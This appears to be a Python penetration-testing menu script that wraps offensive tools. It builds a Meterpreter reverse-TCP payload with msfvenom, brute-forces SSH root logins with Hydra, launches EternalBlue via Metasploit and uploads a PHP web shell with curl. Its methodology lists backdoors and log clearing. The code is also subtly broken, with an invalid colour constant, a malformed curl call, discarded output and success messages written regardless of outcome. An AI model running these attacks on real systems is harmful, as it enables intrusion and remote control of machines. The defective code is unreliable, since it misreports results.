######################################################################################################################################################################################################################
# Python script Penetration Testing & Ethical Hacking Framework, Note: Be mindful of the scope of work, & rules of engagement.
# python pt_framework.py.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import subprocess
import sys
import os
import shutil
from pathlib import Path
from colorama import Fore, Style

# Helper Function to write output to a report
def write_to_report(content):
    report_path = "penetration_test_report.txt"
    with open(report_path, "a") as report_file:
        report_file.write(content + "\n")
    print(f"{Fore.GREEN}Results written to {report_path}{Style.RESET_ALL}")

# Splash Screen
def display_splash_screen():
    splash = """
    
_____________________  ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
 |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_ /\____   |           \_____  /___|
                 /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
   (______)(_______)(_______)(________)(________)(_________)
   
    
    """
    print(f"{Fore.TEAL}{splash}{Style.RESET_ALL}")

# Columnar Display Helper Function
def display_in_columns(options, column_count=2):
    max_length = max(len(option) for option in options)
    formatted_options = [
        f"[{index+1}] {option:<{max_length}}" 
        for index, option in enumerate(options)
    ]
    for i in range(0, len(formatted_options), column_count):
        print("    ".join(formatted_options[i:i + column_count]))

# Check Tool Installation
def check_tool(tool_name):
    return shutil.which(tool_name) is not None

def install_tool(tool_name):
    if sys.platform.startswith("linux"):
        subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])
    else:
        print(f"{Fore.RED}Automatic installation not supported on this OS.{Style.RESET_ALL}")

def check_and_install_tools(tools):
    for tool in tools:
        if not check_tool(tool):
            print(f"{Fore.RED}{tool} is not installed.{Style.RESET_ALL}")
            choice = input(f"Do you want to install {tool}? (y/n): ").lower()
            if choice == "y":
                install_tool(tool)

# Methodology Layout
def display_methodology():
    methodology = """
    Penetration Testing Methodology:

    1. Reconnaissance (Information Gathering)
        - Network Discovery
        - OS Fingerprinting
        - Service Enumeration

    2. Scanning & Enumeration
        - Vulnerability Scanning
        - Enumeration of SMB, DNS, HTTP, etc.
        - Port Scanning with Nmap

    3. Exploitation
        - Web Application Exploits
        - Network Exploits
        - Social Engineering Attacks

    4. Gaining Access
        - Brute Force Attacks (SSH, HTTP, SMB, etc.)
        - Remote Exploits
        - Web Shells

    5. Maintaining Access
        - Creating Backdoors
        - Installing Persistent Agents
        - Privilege Escalation

    6. Covering Tracks
        - Log Clearing
        - History Deletion
        - Traffic Spoofing

    7. Reporting & Results
        - Documenting Findings
        - Recommendations
        - Executive Summary

    """
    print(f"{Fore.TEAL}{methodology}{Style.RESET_ALL}")

# Reconnaissance Tools
def run_reconnaissance_tools():
    print(f"{Fore.CYAN}Running Reconnaissance Tools...{Style.RESET_ALL}")
    # Nmap Scan Example
    target = input(f"{Fore.YELLOW}Enter target IP for Nmap scan: {Style.RESET_ALL}")
    subprocess.run(["nmap", "-sV", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    write_to_report(f"Nmap scan on {target} completed.")
    
# Scanning & Enumeration Tools
def run_scanning_tools():
    print(f"{Fore.CYAN}Running Scanning & Enumeration Tools...{Style.RESET_ALL}")
    # Nikto web scan example
    target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
    subprocess.run(["nikto", "-h", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    write_to_report(f"Nikto scan on {target} completed.")
    
# Gaining Access Tools
def gaining_access_menu():
    print(f"\n{Fore.TEAL}Gaining Access:{Style.RESET_ALL}")
    options = [
        "Launch MSFVenom",
        "Brute Force with Hydra",
        "Exploit SMB with EternalBlue",
        "Web Shell Upload",
        "Return to Main Menu"
    ]
    display_in_columns(options, column_count=2)

    try:
        choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
        if choice == 1:
            print(f"{Fore.YELLOW}Launching MSFVenom...{Style.RESET_ALL}")
            # Example payload generation
            subprocess.run(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=192.168.1.1", "LPORT=4444", "-f", "exe", "-o", "payload.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            write_to_report("MSFVenom payload created.")
        elif choice == 2:
            print(f"{Fore.YELLOW}Launching Hydra for brute force...{Style.RESET_ALL}")
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            subprocess.run(["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", f"ssh://{target}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            write_to_report(f"Brute force attempt on {target} with Hydra completed.")
        elif choice == 3:
            print(f"{Fore.YELLOW}Exploiting SMB with EternalBlue...{Style.RESET_ALL}")
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            subprocess.run(["msfconsole", "-q", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target}; run"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            write_to_report(f"EternalBlue exploit on {target} attempted.")
        elif choice == 4:
            print(f"{Fore.YELLOW}Uploading Web Shell...{Style.RESET_ALL}")
            # Example of uploading a web shell to a server
            target_url = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
            subprocess.run(["curl", "-X", "POST", "-F", f"file=@webshell.php {target_url}/upload"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            write_to_report(f"Web shell uploaded to {target_url}.")
        elif choice == 5:
            main_menu()
        else:
            print(f"{Fore.RED}Invalid choice, returning to Gaining Access Menu.{Style.RESET_ALL}")
            gaining_access_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        gaining_access_menu()

# Main Menu
def main_menu():
    display_splash_screen()
    print(f"{Fore.TEAL}Welcome to the Penetration Testing Framework!{Style.RESET_ALL}")
    options = [
        "Penetration Test Methodology",
        "Reconnaissance & Scanning",
        "Gaining Access Tools",
        "Setup Proxies",
        "Maintaining Access (Placeholder)",
        "Covering Tracks (Placeholder)",
        "Exit"
    ]
    display_in_columns(options, column_count=2)

    try:
        choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
        if choice == 1:
            display_methodology()
            main_menu()
        elif choice == 2:
            run_reconnaissance_tools()
            main_menu()
        elif choice == 3:
            gaining_access_menu()
        elif choice == 4:
            print(f"{Fore.YELLOW}Setting up proxies (Feature not implemented yet).{Style.RESET_ALL}")
            write_to_report("Proxies setup placeholder.")
            main_menu()
        elif choice == 5:
            print(f"{Fore.YELLOW}Maintaining Access (Feature not implemented yet).{Style.RESET_ALL}")
            write_to_report("Maintaining access placeholder.")
            main_menu()
        elif choice == 6:
            print(f"{Fore.YELLOW}Covering Tracks (Feature not implemented yet).{Style.RESET_ALL}")
            write_to_report("Covering tracks placeholder.")
            main_menu()
        elif choice == 7:
            print(f"{Fore.RED}Exiting the script.{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
            main_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        main_menu()

# Run the program
if __name__ == "__main__":
    main_menu()
